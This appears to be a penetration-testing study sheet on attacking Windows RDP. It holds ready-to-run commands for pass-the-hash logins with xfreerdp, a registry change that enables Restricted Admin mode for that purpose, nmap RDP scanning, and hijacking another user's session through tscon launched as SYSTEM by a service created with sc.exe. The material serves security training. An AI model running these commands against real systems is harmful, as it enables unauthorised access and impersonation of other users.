## delete


# Interacting
## Connecting
```bash
# ClearPassword
$ xfreerdp /v:<target-IP> /d:<domain> /u:<username> /p:<password>

# PTH
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
$ xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
```

# Footprinting
## Nmap
```bash
$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

# RDP Session Hijacking
```
PS > query user
```
As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:

```
> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.

```
> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

To run the command, we can start the sessionhijack service :

```
> net start sessionhijack
```

`Note: This method no longer works on Server 2019.`
